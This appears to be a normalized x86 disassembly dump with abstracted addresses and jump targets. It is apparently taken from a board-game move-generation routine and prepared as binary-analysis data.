lea ecx [ ecx + ecx * 2 ]
lea ecx [ edx + ecx * 4 ]
mov edx [ ebp + 0x8 ]
cmp [ edx + ecx * 4 - 0x34 ] 0x20
mov edx [ ebp + 0x18 ]
jne r-xdata
mov ecx [ rw-data ]
mov edx [ rw-data ]
lea ecx [ edi + edi * 2 ]
lea ecx [ edx + ecx * 4 ]
mov edx [ ebp + 0x8 ]
mov ecx [ edx + ecx * 4 + 0x8 ]
inc [ esi + eax * 4 ]
mov edx [ ebp + 0x18 ]
mov [ ebp - 0x8 ] ecx
mov [ rw-data ] ecx
cmp ecx 0x20
je r-xdata
mov ecx eax
shl ecx 0x5
add ecx edi
mov [ edx + ecx * 4 ] 0x1
jl r-xdata
mov ecx [ rw-data ]
mov edx [ rw-data ]
lea ecx [ edi + edi * 2 ]
lea ecx [ edx + ecx * 4 ]
mov edx [ ebp + 0x8 ]
mov ecx [ edx + ecx * 4 + 0x8 ]
inc [ esi + eax * 4 ]
mov edx [ ebp + 0x18 ]
mov [ ebp - 0x8 ] ecx
mov [ rw-data ] ecx
cmp ecx 0x20
je r-xdata
mov ecx eax
shl ecx 0x5
add ecx edi
mov [ edx + ecx * 4 ] 0x1
mov [ rw-data ] edi
mov [ rw-data ] ebx
cmp edi 0x1
jl r-xdata
cmp ebx 0x1
jl r-xdata
cmp ebx 0xa
jg r-xdata
mov esi [ ebp + 0x8 ]
lea ecx [ ecx + ecx * 2 ]
lea ecx [ ebx + ecx * 4 ]
mov ecx [ esi + ecx * 4 ]
mov esi [ ebp + 0x14 ]
mov [ ebp - 0x8 ] ecx
mov [ rw-data ] ecx
inc [ esi + eax * 4 ]
cmp ecx 0x20
je r-xdata
lea ecx [ ebx + ebx * 2 ]
mov ebx [ rw-data ]
lea ecx [ ebx + ecx * 4 ]
mov ebx [ ebp + 0x8 ]
mov ebx [ ebx + ecx * 4 - 0x4 ]
inc [ esi + eax * 4 ]
mov [ rw-data ] ebx
cmp ebx 0x20
je r-xdata
mov ecx eax
shl ecx 0x5
add ecx [ ebp - 0x8 ]
mov [ edx + ecx * 4 ] 0x1
mov ecx eax
shl ecx 0x5
add ecx edi
mov [ edx + ecx * 4 ] 0x1
jmp r-xdata
cmp ebx 0x1
jl r-xdata
cmp ebx 0xa
jg r-xdata
mov esi [ ebp + 0x8 ]
lea ecx [ ecx + ecx * 2 ]
lea ecx [ ebx + ecx * 4 ]
mov ecx [ esi + ecx * 4 ]
mov esi [ ebp + 0x14 ]
mov [ ebp - 0xc ] ecx
mov [ rw-data ] ecx
inc [ esi + eax * 4 ]
cmp ecx 0x20
je r-xdata
lea ecx [ ebx + ebx * 2 ]
mov ebx [ rw-data ]
lea ecx [ ebx + ecx * 4 ]
mov ebx [ ebp + 0x8 ]
mov ebx [ ebx + ecx * 4 - 0x4 ]
inc [ esi + eax * 4 ]
mov [ rw-data ] ebx
cmp ebx 0x20
je r-xdata
mov ecx eax
shl ecx 0x5
add ecx [ ebp - 0xc ]
mov [ edx + ecx * 4 ] 0x1
mov ecx eax
shl ecx 0x5
add ecx edi
mov [ edx + ecx * 4 ] 0x1
jmp r-xdata
mov ecx [ ebp - 0xc ]
add ecx ebx
jmp r-xdata
inc [ esi + eax * 4 ]
mov [ rw-data ] edi
cmp edi edi
je r-xdata
mov ecx eax
shl ecx 0x5
add ecx edi
mov [ edx + ecx * 4 ] 0x1
inc ebx
add ecx 0x4
mov [ ebp - 0x4 ] ecx
cmp ebx 0xa
jle r-xdata
mov ecx eax
shl ecx 0x5
add ecx edi
mov [ edx + ecx * 4 ] 0x1
mov ecx [ ebp - 0x4 ]
mov edi [ ecx ]
cmp edi 0x20
jne r-xdata
jmp r-xdata
mov ecx [ ebp - 0xc ]
add ecx ebx
jmp r-xdata
inc [ esi + eax * 4 ]
mov [ rw-data ] edi
cmp edi edi
je r-xdata
mov ecx eax
shl ecx 0x5
add ecx edi
mov [ edx + ecx * 4 ] 0x1
inc ebx
add ecx 0x4
mov [ ebp - 0x4 ] ecx
cmp ebx 0xa
jle r-xdata
mov ecx eax
shl ecx 0x5
add ecx edi
mov [ edx + ecx * 4 ] 0x1
mov ecx [ ebp - 0x4 ]
mov edi [ ecx ]
cmp edi 0x20
jne r-xdata
jmp r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
mov ecx [ ebp - 0xc ]
add ecx ebx
mov ebx [ ebp + 0x8 ]
mov edi [ ebx + ecx * 4 ]
inc [ esi + eax * 4 ]
mov [ rw-data ] edi
cmp edi 0x20
je r-xdata
mov [ ebp - 0x4 ] 0x1
inc ebx
add ecx 0x4
mov [ ebp - 0x8 ] ecx
cmp ebx 0xa
jle r-xdata
inc [ esi + eax * 4 ]
mov [ rw-data ] edi
cmp edi edi
je r-xdata
mov ecx [ rw-data ]
mov ecx eax
shl ecx 0x5
add ecx edi
mov [ edx + ecx * 4 ] 0x1
mov edi [ ecx ]
cmp edi 0x20
jne r-xdata
jmp r-xdata
mov ecx eax
shl ecx 0x5
add ecx edi
mov [ edx + ecx * 4 ] 0x1
mov ecx [ ebp - 0x8 ]
jmp r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
mov ecx [ ebp - 0xc ]
add ecx ebx
mov ebx [ ebp + 0x8 ]
mov edi [ ebx + ecx * 4 ]
inc [ esi + eax * 4 ]
mov [ rw-data ] edi
cmp edi 0x20
je r-xdata
mov [ ebp - 0x4 ] 0x1
inc ebx
add ecx 0x4
mov [ ebp - 0x8 ] ecx
cmp ebx 0xa
jle r-xdata
inc [ esi + eax * 4 ]
mov [ rw-data ] edi
cmp edi edi
je r-xdata
mov ecx [ rw-data ]
mov ecx eax
shl ecx 0x5
add ecx edi
mov [ edx + ecx * 4 ] 0x1
mov edi [ ecx ]
cmp edi 0x20
jne r-xdata
jmp r-xdata
mov ecx eax
shl ecx 0x5
add ecx edi
mov [ edx + ecx * 4 ] 0x1
mov ecx [ ebp - 0x8 ]
jmp r-xdata
mov ecx eax
shl ecx 0x5
add ecx edi
jmp r-xdata
mov [ edx + ecx * 4 + 0x800 ] 0x1
jmp r-xdata
mov ebx [ ebp + 0x8 ]
mov edi [ ebx + ecx * 4 ]
inc [ esi + eax * 4 ]
mov [ rw-data ] edi
cmp edi 0x20
je r-xdata
lea ecx [ edi + edi * 2 ]
lea ecx [ ebx + ecx * 4 ]
jmp r-xdata
mov ecx eax
shl ecx 0x5
add ecx [ ebp - 0x8 ]
mov [ edx + ecx * 4 ] 0x1
mov ecx eax
shl ecx 0x5
add ecx [ ebp - 0x8 ]
mov [ edx + ecx * 4 ] 0x1
cmp ebx 0x1
jmp r-xdata
mov edx [ ebp + 0x8 ]
lea ecx [ ecx + ecx * 2 ]
lea ecx [ ebx + ecx * 4 ]
mov ecx [ edx + ecx * 4 ]
inc [ esi + eax * 4 ]
mov edx [ ebp + 0x18 ]
mov [ ebp - 0xc ] ecx
mov [ rw-data ] ecx
cmp ecx 0x20
je r-xdata
lea ecx [ edi + edi * 2 ]
lea ecx [ ebx + ecx * 4 ]
mov ebx [ ebp + 0x8 ]
mov ebx [ ebx + ecx * 4 ]
inc [ esi + eax * 4 ]
mov [ rw-data ] ebx
cmp ebx 0x20
je r-xdata
mov ecx eax
shl ecx 0x5
add ecx [ ebp - 0x8 ]
mov [ edx + ecx * 4 ] 0x1
mov ecx eax
shl ecx 0x5
add ecx ebx
mov [ edx + ecx * 4 ] 0x1
mov edx [ ebp + 0x8 ]
lea ecx [ ecx + ecx * 2 ]
lea ecx [ ebx + ecx * 4 ]
mov ecx [ edx + ecx * 4 ]
inc [ esi + eax * 4 ]
mov edx [ ebp + 0x18 ]
mov [ rw-data ] ecx
cmp ecx 0x20
je r-xdata
lea ecx [ edi + edi * 2 ]
lea ecx [ ebx + ecx * 4 ]
mov ebx [ ebp + 0x8 ]
mov ebx [ ebx + ecx * 4 ]
inc [ esi + eax * 4 ]
mov [ rw-data ] ebx
cmp ebx 0x20
je r-xdata
mov ecx eax
shl ecx 0x5
add ecx [ ebp - 0xc ]
mov [ edx + ecx * 4 ] 0x1
mov ecx eax
shl ecx 0x5
add ecx ebx
mov [ edx + ecx * 4 ] 0x1
dec ebx
sub ecx 0x4
mov [ rw-data ] ebx
mov [ ebp - 0x4 ] ecx
cmp ebx 0x1
jge r-xdata
mov ecx eax
shl ecx 0x5
add ecx edi
mov [ edx + ecx * 4 ] 0x1
mov ecx [ ebp - 0x4 ]
mov edi [ ecx ]
cmp edi 0x20
jne r-xdata
jmp r-xdata
dec ebx
sub ecx 0x4
mov [ rw-data ] ebx
mov [ ebp - 0x4 ] ecx
cmp ebx 0x1
jge r-xdata
mov ecx eax
shl ecx 0x5
add ecx edi
mov [ edx + ecx * 4 ] 0x1
mov ecx [ ebp - 0x4 ]
mov edi [ ecx ]
cmp edi 0x20
jne r-xdata
jmp r-xdata
mov ecx [ ebp - 0xc ]
add ecx ebx
jmp r-xdata
mov [ rw-data ] 0x1
dec ebx
sub ecx 0x4
mov [ rw-data ] ebx
mov [ ebp - 0x8 ] ecx
cmp ebx 0x1
jge r-xdata
inc [ esi + eax * 4 ]
mov [ rw-data ] edi
cmp edi edi
je r-xdata
mov ecx eax
shl ecx 0x5
add ecx edi
mov [ edx + ecx * 4 ] 0x1
mov edi [ ecx ]
cmp edi 0x20
jne r-xdata
jmp r-xdata
mov ecx eax
shl ecx 0x5
add ecx edi
mov [ edx + ecx * 4 ] 0x1
mov ecx [ ebp - 0x8 ]
jmp r-xdata
mov ecx [ ebp - 0xc ]
add ecx ebx
jmp r-xdata
mov [ rw-data ] 0x1
dec ebx
sub ecx 0x4
mov [ rw-data ] ebx
mov [ ebp - 0x8 ] ecx
cmp ebx 0x1
jge r-xdata
inc [ esi + eax * 4 ]
mov [ rw-data ] edi
cmp edi edi
je r-xdata
mov ecx eax
shl ecx 0x5
add ecx edi
mov [ edx + ecx * 4 ] 0x1
mov edi [ ecx ]
cmp edi 0x20
jne r-xdata
jmp r-xdata
mov ecx eax
shl ecx 0x5
add ecx edi
mov [ edx + ecx * 4 ] 0x1
mov ecx [ ebp - 0x8 ]
jmp r-xdata
mov [ edx + ecx * 4 ] 0x1
mov ecx eax
shl ecx 0x5
add ecx [ ebp - 0xc ]
mov ecx eax
shl ecx 0x5
add ecx ebx
mov [ edx + ecx * 4 ] 0x1
mov ecx eax
shl ecx 0x5
add ecx [ rw-data ]
jmp r-xdata
mov ecx eax
shl ecx 0x5
add ecx ebx
mov [ edx + ecx * 4 ] 0x1
mov edi [ ecx ]
cmp edi 0x20
jne r-xdata
jmp r-xdata
mov edi [ ecx ]
cmp edi 0x20
jne r-xdata
jmp r-xdata
mov edi [ ecx ]
cmp edi 0x20
jne r-xdata
jmp r-xdata
mov ecx eax
shl ecx 0x5
add ecx edi
mov [ edx + ecx * 4 ] 0x1
mov ecx [ ebp - 0x8 ]
jmp r-xdata
mov edi [ ecx ]
cmp edi 0x20
jne r-xdata
jmp r-xdata
mov ecx eax
shl ecx 0x5
add ecx edi
mov [ edx + ecx * 4 ] 0x1
mov ecx [ ebp - 0x8 ]
jmp r-xdata
mov [ edx + ecx * 4 ] 0x1
sub_407550
push ebp
mov ebp esp
mov eax [ ebp + 0x1c ]
sub esp 0xc
push ebx
push esi
push edi
mov edi [ ebp + 0x10 ]
mov [ eax ] 0x0
mov ecx [ edi ]
mov ebx [ ecx * 4 + r--data ]
mov [ rw-data ] ebx
cmp ebx [ ecx * 4 + r--data ]
jg r-xdata
pop edi
pop esi
mov eax 0x1
pop ebx
mov esp ebp
pop ebp
retn
mov esi [ ebp + 0x18 ]
mov edx [ ebp + 0xc ]
nop [ eax + eax ] ax
mov ecx [ ebp + 0x10 ]
inc ebx
mov [ rw-data ] ebx
mov ecx [ ecx ]
cmp ebx [ ecx * 4 + r--data ]
jg r-xdata
mov edx [ edx + ebx * 8 + 0x4 ]
mov [ rw-data ] edx
cmp ebx 0x1f
ja r-xdata
mov edi [ ebp + 0x10 ]
jmp r-xdata
mov edx [ ebp + 0xc ]
movzx ecx [ ebx + lookup_table_409e74 ]
jmp [ ecx * 4 + jump_table_409e3c ]
mov ecx [ edx + ebx * 8 ]
mov [ rw-data ] ecx
test ecx ecx
je r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0xc ]
mov ecx [ ecx ]
cmp ecx [ eax + 0x80 ]
mov eax [ ebp + 0x1c ]
jne r-xdata
mov ecx [ ebp + 0xc ]
mov esi [ ebp + 0xc ]
mov ecx [ ecx ]
cmp ecx [ esi + 0x80 ]
mov esi [ ebp + 0x18 ]
jne r-xdata
mov ecx [ rw-data ]
lea esi [ edx + 0x1 ]
inc ecx
mov [ ebp - 0x4 ] esi
mov [ rw-data ] esi
mov esi [ ebp + 0x18 ]
mov [ rw-data ] ecx
cmp ecx 0x6
jg r-xdata
mov ecx [ rw-data ]
lea esi [ edx + 0x1 ]
inc ecx
mov [ ebp - 0x8 ] esi
mov [ rw-data ] esi
mov esi [ ebp + 0x18 ]
mov [ rw-data ] ecx
cmp ecx 0x6
jg r-xdata
mov ecx [ rw-data ]
lea esi [ edx + 0x2 ]
add ecx 0x2
mov [ ebp - 0x4 ] esi
mov [ rw-data ] esi
mov esi [ ebp + 0x18 ]
mov [ rw-data ] ecx
cmp ecx 0x9
jg r-xdata
mov ecx [ rw-data ]
lea esi [ edx + 0x2 ]
add ecx 0x2
mov [ ebp - 0x4 ] esi
mov [ rw-data ] esi
mov esi [ ebp + 0x18 ]
mov [ rw-data ] ecx
cmp ecx 0x9
jg r-xdata
mov ecx [ rw-data ]
mov edi [ ebp + 0x8 ]
lea eax [ ecx + ecx * 2 ]
shl eax 0x2
mov [ ebp - 0x4 ] eax
add eax edx
mov [ ebp - 0x8 ] eax
cmp [ edi + eax * 4 + 0x30 ] 0x20
mov eax [ ebp + 0x1c ]
jne r-xdata
mov ecx [ rw-data ]
mov edi [ ebp + 0x8 ]
lea eax [ ecx + ecx * 2 ]
shl eax 0x2
mov [ ebp - 0x4 ] eax
add eax edx
mov [ ebp - 0x8 ] eax
cmp [ edi + eax * 4 + 0x30 ] 0x20
mov eax [ ebp + 0x1c ]
jne r-xdata
mov edi [ rw-data ]
inc edi
mov [ rw-data ] edi
cmp edi 0x9
jg r-xdata
mov edi [ rw-data ]
inc edi
mov [ rw-data ] edi
cmp edi 0x9
jg r-xdata
mov edi [ rw-data ]
xor edx edx
inc edi
mov [ rw-data ] edx
mov [ rw-data ] edi
cmp edi 0x9
jg r-xdata
mov edi [ rw-data ]
xor edx edx
inc edi
mov [ rw-data ] edx
mov [ rw-data ] edi
cmp edi 0x9
jg r-xdata
lea ecx [ edx - 0x1 ]
mov [ rw-data ] ecx
cmp ecx 0x1
jl r-xdata
lea ecx [ edx + 0x1 ]
mov [ rw-data ] ecx
cmp ecx 0xa
jg r-xdata
lea ecx [ edx + 0x1 ]
mov [ rw-data ] ecx
cmp ecx 0xa
jg r-xdata
mov ecx [ ebp + 0xc ]
mov [ rw-data ] 0x0
mov edx [ ecx + 0x84 ]
inc edx
mov [ rw-data ] edx
cmp edx [ ecx + 0x4 ]
jge r-xdata
lea ecx [ edx + 0x1 ]
mov [ rw-data ] ecx
cmp ecx 0x3
jg r-xdata
mov ecx [ ebp + 0xc ]
mov [ rw-data ] 0x0
mov edx [ ecx + 0x84 ]
inc edx
mov [ rw-data ] edx
cmp edx [ ecx + 0x4 ]
jge r-xdata
dec edx
mov [ rw-data ] ecx
mov [ ebp - 0x8 ] edx
mov [ rw-data ] edx
cmp ecx 0x6
jg r-xdata
lea eax [ edx + 0x1 ]
cmp eax 0xa
mov eax [ ebp + 0x1c ]
jg r-xdata
dec edx
mov [ rw-data ] ecx
mov [ ebp - 0x4 ] edx
mov [ rw-data ] edx
cmp ecx 0x6
jg r-xdata
lea eax [ edx + 0x1 ]
cmp eax 0x3
mov eax [ ebp + 0x1c ]
jg r-xdata
mov [ rw-data ] ecx
lea edi [ edx - 0x2 ]
mov [ ebp - 0x8 ] edi
mov [ rw-data ] edi
mov edi [ ebp + 0x10 ]
cmp ecx 0x9
jg r-xdata
lea eax [ edx + 0x2 ]
cmp eax 0xa
mov eax [ ebp + 0x1c ]
jg r-xdata
mov [ rw-data ] ecx
lea edi [ edx - 0x2 ]
mov [ ebp - 0x8 ] edi
mov [ rw-data ] edi
mov edi [ ebp + 0x10 ]
cmp ecx 0x9
jg r-xdata
lea eax [ edx + 0x2 ]
cmp eax 0x5
mov eax [ ebp + 0x1c ]
jg r-xdata
mov esi [ ebp + 0x8 ]
dec ecx
mov [ rw-data ] ecx
lea ecx [ ecx + ecx * 2 ]
lea ecx [ edx + ecx * 4 ]
cmp [ esi + ecx * 4 ] 0x20
mov esi [ ebp + 0x18 ]
jne r-xdata
add ecx 0x2
lea esi [ edx + 0x1 ]
mov [ rw-data ] esi
mov esi [ ebp + 0x18 ]
mov [ rw-data ] ecx
cmp ecx 0x9
jg r-xdata
mov esi [ ebp + 0x8 ]
dec ecx
mov [ rw-data ] ecx
lea ecx [ ecx + ecx * 2 ]
lea ecx [ edx + ecx * 4 ]
cmp [ esi + ecx * 4 ] 0x20
mov esi [ ebp + 0x18 ]
jne r-xdata
add ecx 0x2
lea esi [ edx + 0x1 ]
mov [ rw-data ] esi
mov esi [ ebp + 0x18 ]
mov [ rw-data ] ecx
cmp ecx 0x9
jg r-xdata
mov edi [ rw-data ]
dec edi
mov [ rw-data ] edi
cmp edi 0x1
jl r-xdata
lea ecx [ edi + edi * 2 ]
lea ecx [ edx + ecx * 4 ]
mov edx [ ebp + 0x8 ]
lea ecx [ edx + ecx * 4 ]
mov [ ebp - 0x8 ] ecx
mov edi [ rw-data ]
dec edi
mov [ rw-data ] edi
cmp edi 0x1
jl r-xdata
lea ecx [ edi + edi * 2 ]
lea ecx [ edx + ecx * 4 ]
mov edx [ ebp + 0x8 ]
lea ecx [ edx + ecx * 4 ]
mov [ ebp - 0x8 ] ecx
mov edi [ rw-data ]
xor edx edx
dec edi
mov [ rw-data ] edx
mov [ rw-data ] edi
cmp edi 0x1
jl r-xdata
mov esi [ rw-data ]
lea ecx [ edi + edi * 2 ]
lea ecx [ esi + ecx * 4 ]
mov esi [ ebp + 0x8 ]
lea ecx [ esi + ecx * 4 ]
mov esi [ ebp + 0x18 ]
mov [ ebp - 0x8 ] ecx
nop [ eax ] eax
mov edi [ rw-data ]
xor edx edx
dec edi
mov [ rw-data ] edx
mov [ rw-data ] edi
cmp edi 0x1
jl r-xdata
mov esi [ rw-data ]
lea ecx [ edi + edi * 2 ]
lea ecx [ esi + ecx * 4 ]
mov esi [ ebp + 0x8 ]
lea ecx [ esi + ecx * 4 ]
mov esi [ ebp + 0x18 ]
mov [ ebp - 0x8 ] ecx
nop
cmp edx 0x5
jg r-xdata
mov ecx [ rw-data ]
mov esi [ ebp + 0x8 ]
lea ecx [ ecx + ecx * 2 ]
lea ecx [ ecx * 4 - 0x1 ]
add ecx edx
lea ecx [ esi + ecx * 4 ]
mov esi [ ebp + 0x18 ]
mov [ ebp - 0xc ] ecx
mov ecx [ ecx ]
cmp [ ecx * 4 + r--data ] 0x0
je r-xdata
cmp edx 0x6
jl r-xdata
mov ecx [ rw-data ]
mov esi [ ebp + 0x8 ]
lea ecx [ ecx + ecx * 2 ]
lea ecx [ ecx * 4 + 0x1 ]
add ecx edx
lea ecx [ esi + ecx * 4 ]
mov esi [ ebp + 0x18 ]
mov [ ebp - 0xc ] ecx
mov ecx [ ecx ]
cmp [ ecx * 4 + r--data ] 0x1
je r-xdata
lea ecx [ edx - 0x1 ]
mov [ rw-data ] ecx
cmp ecx 0x8
jl r-xdata
mov ecx [ rw-data ]
mov edi [ ebp + 0x8 ]
lea ecx [ ecx + ecx * 2 ]
lea ecx [ ecx * 4 + 0x1 ]
add ecx edx
lea ecx [ edi + ecx * 4 ]
mov edi [ ebp + 0x10 ]
mov [ ebp - 0x8 ] ecx
mov ecx [ ecx ]
cmp [ ecx * 4 + r--data ] 0x0
je r-xdata
mov ecx [ eax ]
mov edx [ ebp + 0x14 ]
mov [ edx + ecx * 4 ] 0x0
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 ] edx
mov edx [ eax ]
mov ecx [ ebp + 0xc ]
mov ecx [ ecx + 0x84 ]
mov [ esi + edx * 8 + 0x4 ] ecx
mov ecx [ rw-data ]
inc [ eax ]
mov esi [ ebp + 0x8 ]
lea edx [ ecx + ecx * 2 ]
mov ecx [ ebp + 0xc ]
mov ecx [ ecx + 0x84 ]
lea ecx [ ecx + edx * 4 ]
xor edx edx
cmp [ edi ] edx
mov ecx [ esi + ecx * 4 ]
mov esi [ ebp + 0x18 ]
sete dl
cmp ecx [ edx * 4 + r--data ]
je r-xdata
mov ecx [ rw-data ]
mov edi [ ebp + 0x8 ]
lea ecx [ ecx + ecx * 2 ]
lea ecx [ edx + ecx * 4 ]
lea ecx [ edi + ecx * 4 ]
mov edi [ ebp + 0x10 ]
nop [ eax ] eax
lea ecx [ edx - 0x1 ]
mov [ rw-data ] ecx
cmp ecx 0x1
jl r-xdata
mov ecx [ rw-data ]
mov edi [ ebp + 0x8 ]
lea ecx [ ecx + ecx * 2 ]
lea ecx [ ecx * 4 + 0x1 ]
add ecx edx
lea ecx [ edi + ecx * 4 ]
mov edi [ ebp + 0x10 ]
mov [ ebp - 0x8 ] ecx
mov ecx [ ecx ]
cmp [ ecx * 4 + r--data ] 0x1
je r-xdata
mov ecx [ eax ]
mov edx [ ebp + 0x14 ]
mov [ edx + ecx * 4 ] 0x10
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 ] edx
mov edx [ eax ]
mov ecx [ ebp + 0xc ]
mov ecx [ ecx + 0x4 ]
mov [ esi + edx * 8 + 0x4 ] ecx
mov ecx [ rw-data ]
inc [ eax ]
mov esi [ ebp + 0x8 ]
lea edx [ ecx + ecx * 2 ]
mov ecx [ ebp + 0xc ]
mov ecx [ ecx + 0x4 ]
lea ecx [ ecx + edx * 4 ]
xor edx edx
cmp [ edi ] edx
mov ecx [ esi + ecx * 4 ]
mov esi [ ebp + 0x18 ]
sete dl
cmp ecx [ edx * 4 + r--data ]
je r-xdata
mov ecx [ rw-data ]
mov edi [ ebp + 0x8 ]
lea ecx [ ecx + ecx * 2 ]
lea ecx [ edx + ecx * 4 ]
lea ecx [ edi + ecx * 4 ]
mov edi [ ebp + 0x10 ]
mov edx [ rw-data ]
mov ecx [ ebp - 0x4 ]
dec edx
mov [ rw-data ] edx
mov [ rw-data ] ecx
cmp edx 0x4
jl r-xdata
cmp edx 0x8
jl r-xdata
mov edi [ ebp + 0x8 ]
lea ecx [ ecx + ecx * 2 ]
lea ecx [ ecx * 4 + 0x1 ]
add ecx edx
lea ecx [ edi + ecx * 4 ]
mov edi [ ebp + 0x10 ]
mov [ ebp - 0x8 ] ecx
mov ecx [ ecx ]
cmp [ ecx * 4 + r--data ] 0x0
je r-xdata
mov edx [ rw-data ]
mov ecx [ ebp - 0x8 ]
dec edx
mov [ rw-data ] edx
mov [ rw-data ] ecx
cmp edx 0x4
jl r-xdata
cmp edx 0x1
jl r-xdata
mov edi [ ebp + 0x8 ]
lea ecx [ ecx + ecx * 2 ]
lea ecx [ ecx * 4 + 0x1 ]
add ecx edx
lea ecx [ edi + ecx * 4 ]
mov edi [ ebp + 0x10 ]
mov [ ebp - 0xc ] ecx
mov ecx [ ecx ]
cmp [ ecx * 4 + r--data ] 0x1
je r-xdata
mov ecx [ rw-data ]
lea edi [ edx + 0x2 ]
add ecx 0xfffffffe
mov [ rw-data ] edi
mov edi [ ebp + 0x10 ]
mov [ rw-data ] ecx
cmp ecx 0x1
jl r-xdata
cmp [ ebp - 0x8 ] 0x6
jl r-xdata
mov edi [ ebp + 0x8 ]
lea ecx [ ecx + ecx * 2 ]
lea ecx [ ecx * 4 + 0x2 ]
add ecx edx
lea ecx [ edi + ecx * 4 ]
mov edi [ ebp + 0x10 ]
mov [ ebp - 0xc ] ecx
mov ecx [ ecx ]
cmp [ ecx * 4 + r--data ] 0x0
je r-xdata
mov ecx [ rw-data ]
lea edi [ edx + 0x2 ]
add ecx 0xfffffffe
mov [ rw-data ] edi
mov edi [ ebp + 0x10 ]
mov [ rw-data ] ecx
cmp ecx 0x1
jl r-xdata
cmp [ ebp - 0x8 ] 0x1
jl r-xdata
mov edi [ ebp + 0x8 ]
lea ecx [ ecx + ecx * 2 ]
lea ecx [ ecx * 4 + 0x2 ]
add ecx edx
lea ecx [ edi + ecx * 4 ]
mov edi [ ebp + 0x10 ]
mov [ ebp - 0xc ] ecx
mov ecx [ ecx ]
cmp [ ecx * 4 + r--data ] 0x1
je r-xdata
mov esi [ ebp + 0x8 ]
mov ecx [ ebp - 0x8 ]
cmp [ esi + ecx * 4 + 0x4 ] 0x20
mov esi [ ebp + 0x18 ]
jne r-xdata
mov ecx [ rw-data ]
lea edi [ edx + 0x1 ]
add ecx 0xfffffffe
mov [ rw-data ] edi
mov edi [ ebp + 0x10 ]
mov [ rw-data ] ecx
cmp ecx 0x1
jl r-xdata
mov [ rw-data ] ecx
lea edi [ edx - 0x1 ]
mov [ rw-data ] edi
mov edi [ ebp + 0x10 ]
cmp ecx 0x9
jg r-xdata
cmp [ rw-data ] 0xa
jg r-xdata
mov esi [ ebp + 0x8 ]
mov ecx [ ebp - 0x8 ]
cmp [ esi + ecx * 4 + 0x4 ] 0x20
mov esi [ ebp + 0x18 ]
jne r-xdata
mov ecx [ rw-data ]
lea edi [ edx + 0x1 ]
add ecx 0xfffffffe
mov [ rw-data ] edi
mov edi [ ebp + 0x10 ]
mov [ rw-data ] ecx
cmp ecx 0x1
jl r-xdata
mov [ rw-data ] ecx
lea edi [ edx - 0x1 ]
mov [ rw-data ] edi
mov edi [ ebp + 0x10 ]
cmp ecx 0x9
jg r-xdata
cmp [ rw-data ] 0xa
jg r-xdata
mov edi [ rw-data ]
inc edi
mov [ rw-data ] edi
cmp edi 0xa
jg r-xdata
lea ecx [ edi + edi * 2 ]
lea ecx [ edx + ecx * 4 ]
mov edx [ ebp + 0x8 ]
lea ecx [ edx + ecx * 4 ]
mov [ ebp - 0x8 ] ecx
nop [ eax ] eax
mov edx [ rw-data ]
lea ecx [ edi + edi * 2 ]
mov esi [ ebp + 0x8 ]
lea ecx [ edx + ecx * 4 ]
lea ecx [ esi + ecx * 4 ]
mov esi [ ebp + 0x18 ]
mov [ ebp - 0xc ] ecx
mov ecx [ ecx ]
cmp [ ecx * 4 + r--data ] 0x0
je r-xdata
mov ecx [ eax ]
mov edx [ ebp + 0x14 ]
mov [ edx + ecx * 4 ] ebx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 ] edi
mov ecx [ eax ]
mov [ esi + ecx * 8 + 0x4 ] edx
xor edx edx
mov ecx [ ebp + 0x10 ]
inc [ eax ]
cmp [ ecx ] edx
mov ecx [ ebp - 0x8 ]
sete dl
mov ecx [ ecx ]
cmp ecx [ edx * 4 + r--data ]
je r-xdata
mov edi [ rw-data ]
inc edi
mov [ rw-data ] edi
cmp edi 0xa
jg r-xdata
lea ecx [ edi + edi * 2 ]
lea ecx [ edx + ecx * 4 ]
mov edx [ ebp + 0x8 ]
lea ecx [ edx + ecx * 4 ]
mov [ ebp - 0x8 ] ecx
mov edx [ rw-data ]
lea ecx [ edi + edi * 2 ]
mov esi [ ebp + 0x8 ]
lea ecx [ edx + ecx * 4 ]
lea ecx [ esi + ecx * 4 ]
mov esi [ ebp + 0x18 ]
mov [ ebp - 0xc ] ecx
mov ecx [ ecx ]
cmp [ ecx * 4 + r--data ] 0x1
je r-xdata
mov ecx [ eax ]
mov edx [ ebp + 0x14 ]
mov [ edx + ecx * 4 ] ebx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 ] edi
mov ecx [ eax ]
mov [ esi + ecx * 8 + 0x4 ] edx
xor edx edx
mov ecx [ ebp + 0x10 ]
inc [ eax ]
cmp [ ecx ] edx
mov ecx [ ebp - 0x8 ]
sete dl
mov ecx [ ecx ]
cmp ecx [ edx * 4 + r--data ]
je r-xdata
mov edi [ rw-data ]
xor edx edx
inc edi
mov [ rw-data ] edx
mov [ rw-data ] edi
cmp edi 0xa
jg r-xdata
mov esi [ rw-data ]
lea ecx [ edi + edi * 2 ]
lea ecx [ esi + ecx * 4 ]
mov esi [ ebp + 0x8 ]
lea ecx [ esi + ecx * 4 ]
mov esi [ ebp + 0x18 ]
mov [ ebp - 0x8 ] ecx
nop [ eax ] eax
test edx edx
jne r-xdata
test edx edx
jne r-xdata
mov edi [ rw-data ]
xor edx edx
inc edi
mov [ rw-data ] edx
mov [ rw-data ] edi
cmp edi 0xa
jg r-xdata
mov esi [ rw-data ]
lea ecx [ edi + edi * 2 ]
lea ecx [ esi + ecx * 4 ]
mov esi [ ebp + 0x8 ]
lea ecx [ esi + ecx * 4 ]
mov esi [ ebp + 0x18 ]
mov [ ebp - 0x8 ] ecx
nop [ eax ] eax
test edx edx
jne r-xdata
test edx edx
jne r-xdata
mov ecx [ rw-data ]
inc ecx
mov [ rw-data ] ecx
cmp ecx 0x9
jg r-xdata
mov ecx [ eax ]
mov edx [ ebp + 0x14 ]
mov [ edx + ecx * 4 ] ebx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 ] edx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 + 0x4 ] edx
xor edx edx
inc [ eax ]
cmp [ edi ] edx
mov ecx [ ebp - 0xc ]
sete dl
mov ecx [ ecx ]
cmp ecx [ edx * 4 + r--data ]
je r-xdata
mov ecx [ rw-data ]
inc ecx
